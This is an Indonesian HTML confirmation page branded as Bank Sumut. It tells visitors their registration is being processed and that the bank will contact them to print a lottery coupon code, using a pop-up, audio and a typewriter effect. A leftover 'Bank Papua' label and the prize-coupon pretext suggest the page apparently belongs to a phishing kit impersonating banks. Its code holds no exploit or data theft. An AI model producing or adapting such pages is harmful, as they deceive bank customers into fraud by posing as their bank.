<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Terima Kasih</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- Google Fonts: Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
  <!-- SweetAlert2 -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    /* Latar belakang halaman */
    body {
      font-family: "Poppins", sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    /* Gambar di atas */
    .img-fluid {
      margin: 0 auto; /* Tengah */
      border-top-right-radius: 150px; /* Border kanan atas */
      border-bottom-right-radius: 150px; /* Border kanan bawah */
      max-height: 300px;
      object-fit: cover;
      object-position: top center; /* Gambar lebih ke atas */
      width: 100%; /* Full width */
    }

    /* Container utama */
    .container {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      width: 100%;
      text-align: center;
      padding: 20px;
    }

    /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
    .message {
      background: linear-gradient(135deg, #4c86c0, #0059b3);
      color: #fff;
      padding: 15px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 20px;
      position: relative;
      min-height: 120px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Area tempat teks diketik satu per satu */
    .typingText {
      white-space: pre-line; /* Multiline */
      text-align: center;
      width: 100%;
    }

    .footer {
      font-size: 14px;
      color: #777;
      margin-top: 10px;
    }

    /* Custom styling untuk SweetAlert2 pop-up */
    .swal2-border-radius {
      border-radius: 12px !important;
    }

    .swal2-image-custom {
      margin-bottom: -10px;
      width: 130px;
    }

    .swal2-text-custom {
      width: 20px;
    }
  </style>
</head>
<body onload="initPage()">

  <!-- Gambar paling atas -->
  <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />

  <div class="container">
    <!-- Kotak pesan dengan efek ketik (typewriter) -->
    <div class="message">
      <div id="typingContainer" class="typingText"></div>
    </div>

    <div class="footer">
      &copy; 2025 BANK SUMUT
    </div>
  </div>

  <audio id="thankYouAudio" src="speech.mp3"></audio>
  <script>
    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Sumut.
Pendaftaran Anda Sedang Diproses.
Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
Untuk Proses Cetak Kode Kupon Undian Anda.`;

    function playAudio() {
      const audio = document.getElementById("thankYouAudio");
      const playPromise = audio.play();
      if (playPromise !== undefined) {
        playPromise.catch((error) => {
          document.body.addEventListener(
            "click",
            () => {
              audio.play();
            },
            { once: true }
          );
        });
      }
    }

    function typeWriterEffect(text, containerId, speed = 40) {
      let index = 0;
      const container = document.getElementById(containerId);
      container.innerHTML = "";

      function typeChar() {
        if (index < text.length) {
          container.innerHTML += text.charAt(index);
          index++;
          setTimeout(typeChar, speed);
        }
      }
      typeChar();
    }

    function showThankYouAlert() {
      Swal.fire({
        width: '320px',
        imageUrl: "icon.png",
        text: "Lanjut proses Penyelesaian.",
        imageAlt: "Bank Papua",
        confirmButtonText: "OK",
        confirmButtonColor: "#004080",
        customClass: {
          text: "swal2-text-custom",
          popup: "swal2-border-radius",
          image: "swal2-image-custom",
        },
      }).then((result) => {
        if (result.isConfirmed) {
          playAudio();
          typeWriterEffect(typewriterText, "typingContainer", 40);
        }
      });
    }

    function initPage() {
      showThankYouAlert();
    }
  </script>
</body>
</html>
